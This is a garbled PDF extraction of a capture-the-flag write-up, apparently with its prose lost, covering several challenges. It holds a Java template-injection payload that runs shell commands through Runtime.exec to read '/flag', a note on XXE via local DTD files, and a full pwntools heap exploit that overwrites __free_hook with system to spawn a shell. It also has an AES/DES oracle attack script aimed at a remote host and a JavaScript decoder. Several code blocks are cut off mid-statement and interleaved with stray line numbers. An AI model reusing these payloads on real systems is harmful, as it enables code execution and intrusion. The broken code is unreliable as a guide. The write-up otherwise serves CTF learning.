27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
do_upgrade.shshell
LookAround
XXE https://mohemiv.com/all/exploiting-xxe-with-local-dtd-ﬁles/
DTDvps/usr/share/xml/fontconﬁg/fonts.dtd 
render
getoutputstreamread
[[${new java.io.BufferedReader(new 
java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec('cat 
/flag').getInputStream())).readLine()}]]
f.write('\0'*512)
f.close()
62
63
64
Easy Realworld Challenge
Log
mblockchain
import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.security.Key;
import java.security.MessageDigest;
1
2
3
4
5
6
7
8
public class Main {
    public static void main(String[] args) {
        System.out.println("Hello World!");
        String en = 
"74f0b165db8a628716b53a9d4f6405980db2f833afa1ed5eeb4304c5220bdc0b541f857a7
348074b2a7775d691e71b490402621e8a53bad4cf7ad4fcc15f20a8066e087fc1b2ffb21c2
7463b5737e34738a6244e1630d8fa1bf4f38b7e71d707425c8225f240f4bd2b03d6c2471e9
00b75154eb6f9dfbdf5a4eca9de5163f9b3ee82959f166924e8ad5f1d744c51416a1db8963
8bb4d1411aa1b1307d88c1fb5";
        byte[][] v4 = new byte[10][];
        try
        {
            for(int i = 0;i = 0; v7--) {
                            v5 = encrypt(v5, v4[v7]);
                        }
                        int b  = v5.length;
                        if(b >0)
                        {
                            String sss = new String(v5);
                            if(sss.startsWith("flag"))
                            System.out.println(sss);
                        }
//                            System.out.println(a);
                    }
                }
                System.out.println("1");
            }
//            System.out.println(v4);
        }
        catch (Exception a)
        {
            System.out.println(a);
        }
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
Hub
2.27free __free_hook ,puts
    }
    public static byte[] hash(byte[] arg2)   throws Exception {
        MessageDigest v0 = MessageDigest.getInstance("MD5");
        v0.update(arg2);
        return v0.digest();
    }
    public static byte[] encrypt(byte[] arg5, byte[] arg6) throws 
Exception {
        SecretKeySpec v0 = new SecretKeySpec(arg6, "AES");
        Cipher v1;
        v1 = Cipher.getInstance("AES/ECB/PKCS5Padding");
        v1.init(Cipher.DECRYPT_MODE, ((Key)v0));
        ByteArrayOutputStream v2 = new ByteArrayOutputStream();
        CipherOutputStream v3 = new CipherOutputStream(((OutputStream)v2), 
v1);
        v3.write(arg5);
        v3.flush();
        v3.close();
        return v2.toByteArray();
    }
    public static byte[] hexToByteArray(String inHex){
        int hexlen = inHex.length();
        byte[] result;
        if (hexlen % 2 == 1){
            hexlen++;
            result = new byte[(hexlen/2)];
            inHex="0"+inHex;
        }else {
            result = new byte[(hexlen/2)];
        }
        int j=0;
        for (int i = 0; i >",str(1))
    sl("How long will you stay?",str(size))
def free(idx):
    sl(">>",str(2))
    sl("Which hub don't you want?",str(idx))
def write(cnt):
    sl(">>",str(3))
    s("What do you want?",cnt)
malloc(0x90)
malloc(0x80)
malloc(0x8)
free(0)
free(0)
malloc(0x48)
free(0)
for i in range(7):
    free(-0xb0)
free(-0xb0)
malloc(0x80)
write("\xe8\xc8")
free(0xb0)
free(0xb0)
malloc(0x48)
write("\x00")
#leaking libc brute
malloc(0x48)
malloc(0x48)
malloc(0x48)
write(p64(0x4006A0))
malloc(0x28)
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
8v
free(0)
p.recvuntil('\n')
libc.address=u64(p.recv(6).ljust(0x8,'\x00'))-0x3ebd20
log.info("libc.address:"+hex(libc.address))
__free_hook = libc.symbols['__free_hook']
log.info("__free_hook:"+hex(__free_hook))
system = libc.sym['system']
log.info("system:"+hex(system))
malloc(0x38)
write(p64(__free_hook))
malloc(0x18)
write("\x30")
malloc(0x18)
malloc(0x18)
malloc(0x18)
write(p64(system))
malloc(0x108)
write("/bin/sh\x00")
free(0)
p.interactive()
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
function e(a)
{
    var s = '\xd2"\xf1\x8d\xb7\xe0\xd0MF\x87T?
\x1fI\x1c\xe7\xcb\x07\xc3\x95z\xb3z\x0b\xbb\xdb\xa1I\xc5;';
    var a1 = s;
    var a2 = new Array(37);
    var a3 = 88;
    for(var i=0;i=0;i--)
    {
            //  t = ((a[i].charCodeAt() ^ a3)*65 + 66)%256;
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
Babycry
            var t = a2[i];
            // a2 += String.fromCharCode(((a3 ^ t)*35 - 16)%256);
            a2[i] = String.fromCharCode (a3 ^ t);
            a3 = ((a3)*35 - 16)%256;
    }
    // console.log(a2);
    return a2;
}
var s = '\xd2"\xf1\x8d\xb7\xe0\xd0MF\x87T?
\x1fI\x1c\xe7\xcb\x07\xc3\x95z\xb3z\x0b\xbb\xdb\xa1I\xc5;';
console.log(e(s));
19
20
21
22
23
24
25
26
27
28
29
from pwn import *
context.log_level = 'debug'
p = remote('139.9.222.76', 19999)
def de(d):
    p.recvuntil('>')
    p.sendline('des ' + d)
    r = p.recvline().strip()
    return r.decode('hex')
guess = 3
flag = '}'
for i in xrange(40):
    ori = de('a' * (guess + len(flag)))
    l = len(flag)/8
    if l == 0:
        ori = ori[-8:]
    else:
        ori = ori[-8 * (l+1) : -8 * l ]
    padding = ''
    if l == 0:
        padding = flag + '_'*(7-len(flag))
    else:
        padding = flag[:7]
    for j in xrange(0x20,0x80):
        guessed = chr(j) + padding
        des = de(guessed)[:8]
        if des == ori:
            flag = chr(j) + flag
            print(flag)
            break
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32